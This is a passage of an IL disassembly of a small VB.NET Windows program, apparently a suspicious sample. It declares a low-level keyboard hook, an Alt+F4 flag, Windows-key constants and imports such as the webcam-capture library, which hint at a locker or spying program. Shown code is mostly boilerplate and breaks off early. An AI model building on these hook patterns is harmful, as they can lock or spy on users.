
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.8.3928.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern user32.dll
.module extern user32
.module extern kernel32.dll
.module extern kernel32
.module extern wintrust.dll
.module extern avicap32.dll
.module extern KERNEL32.DLL
.module extern winmm.dll
.module extern gdi32.dll
.module extern gdi32
.module extern ntdll.dll
.module extern ntdll
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly Application
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 02 00 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 31 46 38 42 32 32 37 31 2D 37 33 30 33   // ..$1F8B2271-7303
                                                                                                  2D 34 46 32 46 2D 38 42 34 42 2D 35 35 36 41 35   // -4F2F-8B4B-556A5
                                                                                                  46 43 42 33 43 38 36 00 00 )                      // FCB3C86..
  .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 31 2E 30 2E 30 2E 30 00 00 )             // ...1.0.0.0..
  .hash algorithm 0x00008004
  .ver 1:0:0:0
}
.module Application.exe
// MVID: {17BAC128-96FF-461E-B44B-345361717F52}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x07070000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase::.ctor()
    IL_0006:  ret
  } // end of method MyApplication::.ctor

} // end of class My.MyApplication

.class private auto ansi My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0006:  ret
  } // end of method MyComputer::.ctor

} // end of class My.MyComputer

.class private auto ansi sealed beforefieldinit My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .method public hidebysig strict virtual 
            instance bool  Equals(object o) cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       13 (0xd)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  ldarg.1
      IL_0002:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0007:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000c:  ret
    } // end of method MyWebServices::Equals

    .method public hidebysig strict virtual 
            instance int32  GetHashCode() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0006:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       11 (0xb)
      .maxstack  8
      IL_0000:  ldtoken    My.MyProject/MyWebServices
      IL_0005:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000a:  ret
    } // end of method MyWebServices::GetType

    .method public hidebysig strict virtual 
            instance string  ToString() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance string [mscorlib]System.Object::ToString()
      IL_0006:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       20 (0x14)
      .maxstack  1
      .locals init (!!T V_0)
      IL_0000:  ldarg.0
      IL_0001:  box        !!T
      IL_0006:  brtrue.s   IL_0010

      IL_0008:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_000d:  stloc.0
      IL_000e:  br.s       IL_0012

      IL_0010:  ldarg.0
      IL_0011:  stloc.0
      IL_0012:  ldloc.0
      IL_0013:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       8 (0x8)
      .maxstack  8
      IL_0000:  ldarg.1
      IL_0001:  initobj    !!T
      IL_0007:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       28 (0x1c)
      .maxstack  8
      IL_0000:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0005:  box        !T
      IL_000a:  brtrue.s   IL_0016

      IL_000c:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0011:  stsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0016:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001b:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> m_AppObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  8
    IL_0000:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::.ctor()
    IL_0005:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::.ctor()
    IL_000f:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_WebServices

  .property class My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class My.MyComputer My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class My.MyApplication Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class My.MyApplication My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User My.MyProject::get_User()
  } // end of property MyProject::User
  .property class My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class My.MyProject/MyWebServices My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class My.MyProject

.class private auto ansi Resources
       extends [mscorlib]System.Object
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 33 53 79 73 74 65 6D 2E 52 65 73 6F 75 72   // ..3System.Resour
                                                                                                  63 65 73 2E 54 6F 6F 6C 73 2E 53 74 72 6F 6E 67   // ces.Tools.Strong
                                                                                                  6C 79 54 79 70 65 64 52 65 73 6F 75 72 63 65 42   // lyTypedResourceB
                                                                                                  75 69 6C 64 65 72 08 31 35 2E 30 2E 30 2E 30 00   // uilder.15.0.0.0.
                                                                                                  00 ) 
  .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private static class [mscorlib]System.Resources.ResourceManager resourceMan
  .field private static class [mscorlib]System.Globalization.CultureInfo resourceCulture
  .method assembly specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Resources::.ctor

  .method assembly specialname static class [mscorlib]System.Resources.ResourceManager 
          get_ResourceManager() cil managed
  {
    // Code size       49 (0x31)
    .maxstack  8
    IL_0000:  ldsfld     class [mscorlib]System.Resources.ResourceManager Resources::resourceMan
    IL_0005:  ldnull
    IL_0006:  call       bool [mscorlib]System.Object::ReferenceEquals(object,
                                                                       object)
    IL_000b:  brfalse.s  IL_002b

    IL_000d:  ldstr      "Resources"
    IL_0012:  ldtoken    Resources
    IL_0017:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_001c:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Type::get_Assembly()
    IL_0021:  newobj     instance void [mscorlib]System.Resources.ResourceManager::.ctor(string,
                                                                                         class [mscorlib]System.Reflection.Assembly)
    IL_0026:  stsfld     class [mscorlib]System.Resources.ResourceManager Resources::resourceMan
    IL_002b:  ldsfld     class [mscorlib]System.Resources.ResourceManager Resources::resourceMan
    IL_0030:  ret
  } // end of method Resources::get_ResourceManager

  .method assembly specialname static class [mscorlib]System.Globalization.CultureInfo 
          get_Culture() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldsfld     class [mscorlib]System.Globalization.CultureInfo Resources::resourceCulture
    IL_0005:  ret
  } // end of method Resources::get_Culture

  .method assembly specialname static void 
          set_Culture(class [mscorlib]System.Globalization.CultureInfo Value) cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  stsfld     class [mscorlib]System.Globalization.CultureInfo Resources::resourceCulture
    IL_0006:  ret
  } // end of method Resources::set_Culture

  .property class [mscorlib]System.Resources.ResourceManager
          ResourceManager()
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) 
    .get class [mscorlib]System.Resources.ResourceManager Resources::get_ResourceManager()
  } // end of property Resources::ResourceManager
  .property class [mscorlib]System.Globalization.CultureInfo
          Culture()
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) 
    .get class [mscorlib]System.Globalization.CultureInfo Resources::get_Culture()
    .set void Resources::set_Culture(class [mscorlib]System.Globalization.CultureInfo)
  } // end of property Resources::Culture
} // end of class Resources

.class public auto ansi Form1
       extends [System.Windows.Forms]System.Windows.Forms.Form
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.DesignerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .class auto ansi sealed nested private SW
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype Form1/SW Hide = int32(0x00000000)
    .field public static literal valuetype Form1/SW Normal = int32(0x00000001)
    .field public static literal valuetype Form1/SW ShowMinimized = int32(0x00000002)
    .field public static literal valuetype Form1/SW ShowMaximized = int32(0x00000003)
    .field public static literal valuetype Form1/SW ShowNoActivate = int32(0x00000004)
    .field public static literal valuetype Form1/SW Show = int32(0x00000005)
    .field public static literal valuetype Form1/SW Minimize = int32(0x00000006)
    .field public static literal valuetype Form1/SW ShowMinNoActive = int32(0x00000007)
    .field public static literal valuetype Form1/SW ShowNA = int32(0x00000008)
    .field public static literal valuetype Form1/SW Restore = int32(0x00000009)
    .field public static literal valuetype Form1/SW ShowDefault = int32(0x0000000A)
    .field public static literal valuetype Form1/SW ForceMinimize = int32(0x0000000B)
    .field public static literal valuetype Form1/SW Max = int32(0x0000000B)
  } // end of class SW

  .class auto ansi sealed nested public LowLevelKeyboardProc
         extends [mscorlib]System.MulticastDelegate
  {
    .method public specialname rtspecialname 
            instance void  .ctor(object TargetObject,
                                 native int TargetMethod) runtime managed
    {
    } // end of method LowLevelKeyboardProc::.ctor

    .method public newslot strict virtual 
            instance class [mscorlib]System.IAsyncResult 
            BeginInvoke(int32 nCode,
                        native int wParam,
                        native int lParam,
                        class [mscorlib]System.AsyncCallback DelegateCallback,
                        object DelegateAsyncState) runtime managed
    {
    } // end of method LowLevelKeyboardProc::BeginInvoke

    .method public newslot strict virtual 
            instance native int  EndInvoke(class [mscorlib]System.IAsyncResult DelegateAsyncResult) runtime managed
    {
    } // end of method LowLevelKeyboardProc::EndInvoke

    .method public newslot strict virtual 
            instance native int  Invoke(int32 nCode,
                                        native int wParam,
                                        native int lParam) runtime managed
    {
    } // end of method LowLevelKeyboardProc::Invoke

  } // end of class LowLevelKeyboardProc

  .field private class [System]System.ComponentModel.IContainer components
  .field private bool keyPressAltF4
  .field private static literal int64 KEYEVENTF_EXTENDEDKEY = int64(0x1)
  .field private static literal int64 KEYEVENTF_KEYUP = int64(0x2)
  .field private static literal uint8 VK_LWIN = uint8(0x5B)
  .field private static literal int32 WH_KEYBOARD_LL = int32(0x0000000D)
  .field public static literal int32 WM_KEYUP = int32(0x00000101)
  .field private static class Form1/LowLevelKeyboardProc _proc
  .field private static native int _hookID
  .field private static literal int32 WM_SYSCOMMAND = int32(0x00000112)
  .field private static literal int32 SC_MINIMIZE = int32(0x0000F020)
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       56 (0x38)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.0
    IL_0008:  ldftn      instance void Form1::Form1_KeyDown(object,
                                                            class [System.Windows.Forms]System.Windows.Forms.KeyEventArgs)
    IL_000e:  newobj     instance void [System.Windows.Forms]System.Windows.Forms.KeyEventHandler::.ctor(object,
                                                                                                         native int)
    IL_0013:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::add_KeyDown(class [System.Windows.Forms]System.Windows.Forms.KeyEventHandler)
    IL_0018:  ldarg.0
    IL_0019:  ldarg.0
    IL_001a:  ldftn      instance void Form1::Form1_Load(object,
                                                         class [mscorlib]System.EventArgs)
    IL_0020:  newobj     instance void [mscorlib]System.EventHandler::.ctor(object,
                                                                            native int)
    IL_0025:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::add_Load(class [mscorlib]System.EventHandler)
    IL_002a:  ldarg.0
    IL_002b:  ldc.i4.0
    IL_002c:  stfld      bool Form1::keyPressAltF4
    IL_0031:  ldarg.0
    IL_0032:  call       instance void Form1::InitializeComponent()
    IL_0037:  ret
  } // end of method Form1::.ctor

  .method family hidebysig strict virtual 
          instance void  Dispose(bool disposing) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       33 (0x21)
    .maxstack  2
    .try
    {
      IL_0000:  ldarg.1
      IL_0001:  brfalse.s  IL_0016

      IL_0003:  ldarg.0
      IL_0004:  ldfld      class [System]System.ComponentModel.IContainer Form1::components
      IL_0009:  brfalse.s  IL_0016

      IL_000b:  ldarg.0
      IL_000c:  ldfld      class [System]System.ComponentModel.IContainer Form1::components
      IL_0011:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0016:  leave.s    IL_0020

    }  // end .try
    finally
    {
      IL_0018:  ldarg.0
      IL_0019:  ldarg.1
      IL_001a:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Dispose(bool)
      IL_001f:  endfinally
    }  // end handler
    IL_0020:  ret
  } // end of method Form1::Dispose

  .method private instance void  InitializeComponent() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       164 (0xa4)
    .maxstack  3
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [System]System.ComponentModel.Container::.ctor()
    IL_0006:  stfld      class [System]System.ComponentModel.IContainer Form1::components
    IL_000b:  ldarg.0
    IL_000c:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::SuspendLayout()
    IL_0011:  ldarg.0
    IL_0012:  ldc.r4     6.
    IL_0017:  ldc.r4     13.
    IL_001c:  newobj     instance void [System.Drawing]System.Drawing.SizeF::.ctor(float32,
                                                                                   float32)
    IL_0021:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleDimensions(valuetype [System.Drawing]System.Drawing.SizeF)
    IL_0026:  ldarg.0
    IL_0027:  ldc.i4.1
    IL_0028:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleMode(valuetype [System.Windows.Forms]System.Windows.Forms.AutoScaleMode)
    IL_002d:  ldarg.0
    IL_002e:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Aqua()
    IL_0033:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_BackColor(valuetype [System.Drawing]System.Drawing.Color)
    IL_0038:  ldarg.0
    IL_0039:  ldc.i4     0x24f
    IL_003e:  ldc.i4     0x15b
    IL_0043:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
